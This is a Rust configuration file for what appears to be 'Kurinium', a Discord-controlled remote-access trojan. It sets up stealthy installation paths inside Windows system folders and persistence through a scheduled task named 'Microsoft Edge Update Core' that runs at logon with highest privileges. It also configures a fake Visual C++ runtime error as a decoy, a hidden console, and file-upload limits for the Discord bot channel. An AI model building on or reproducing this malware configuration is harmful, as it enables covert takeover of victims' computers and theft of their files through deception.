use std::collections::HashSet;
use twilight_model::id::{marker::GuildMarker, Id};

// struct holds all settings for the scheduled task
pub struct StartupConfig {
    pub enabled: bool,
    pub task_name: &'static str,
    pub on_logon: bool, // Run when any user logs on
    pub highest_privileges: bool, // Run with highest privileges
}

#[allow(dead_code)] // ignore unused warning
pub enum MessageBoxIcon {
    Error,
    Warning,
    Info,
    Question,
}

#[allow(dead_code)]// ignore unused warning
pub enum MessageBoxButtons {
    Ok,
    OkCancel,
    YesNo,
}

// struct holds all settings for the fake error
pub struct DecoyConfig {
    pub enabled: bool,
    pub title: &'static str,
    pub message: &'static str,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}

pub struct Config;

impl Config {
    // --- Kurinium configuration ---
    pub const DISCORD_TOKEN: &'static str = "kurinium-bot=token";
    pub const GUILD_ID: u64 = 1000000000000; // replace with your own guild ID
    pub const BOT_PREFIX: &'static str = ".";

    /*
    --- Installation Configuration ---
    1. %LOCALAPPDATA%\Packages
    2. %LOCALAPPDATA%\Microsoft\WindowsApps
    3. %LOCALAPPDATA%\Microsoft\Edge\User Data\Autofill\4.0.1.27\
    4. %APPDATA%\Microsoft\Windows\Themes
    5. %APPDATA%\Microsoft\Templates
    6. %LOCALAPPDATA%\Microsoft\Windows\INetCache
    7. %LOCALAPPDATA%\Microsoft\Windows\WebCache
    */
    pub const INSTALLATION_PATH: u8 = 1; // 1-7 for different installation paths

    pub fn get_startup_config() -> StartupConfig {
        StartupConfig {
            enabled: true,
            task_name: "Microsoft Edge Update Core",
            on_logon: true,
            highest_privileges: true,
        }
    }

    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig {
            // set to false to disable the fake error
            enabled: true,
            title: "Microsoft Visual C++ Runtime Library", // the title of the error window
            // the main error text. use \n for new lines.
            message: "Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call",
            icon: MessageBoxIcon::Error, // icon type: Error, Warning, Info, Question
            buttons: MessageBoxButtons::Ok, // button layout: Ok, OkCancel, YesNo
        }
    }

    // --- Authentication Configuration ---
    pub fn get_auth_config() -> AuthConfig {
        AuthConfig {
            auth_roles: false, // false = disable
            allowed_roles: HashSet::from([
                // Add your role IDs here
                // "ROLE_ID_1".to_string(),
                // "ROLE_ID_2".to_string(),
            ]),
            auth_user: false, // false = disable
            allowed_users: HashSet::from([
                // Add your user IDs here
                // "USER_ID_1".to_string(),
                // "USER_ID_2".to_string(),
            ]),
            auth_all: true, // true = allow everyone
        }
    }
    
    // --- Helper methods ---
    pub fn get_guildid() -> Id<GuildMarker> {
        Id::new(Self::GUILD_ID)
    }

    pub fn get_token() -> String {
        Self::DISCORD_TOKEN.to_string()
    }

    pub fn get_max_bfilesize() -> usize {
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }
    pub const MAX_FILE_SIZE_MB: f64 = 10.0; // Discord file limit | Free = 10mb | Classic = 50mb | Nitro = 500mb
}

// Authentication configuration structure
#[derive(Debug, Clone)]
pub struct AuthConfig {
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true, // Default to allowing everyone
        }
    }
}

#[cfg(debug_assertions)]
impl Config {
    pub const SHOW_CONSOLE: bool = true; // Set to false to hide console completely
}

#[cfg(not(debug_assertions))]
impl Config {
    pub const SHOW_CONSOLE: bool = false; // Hide console in release builds
}
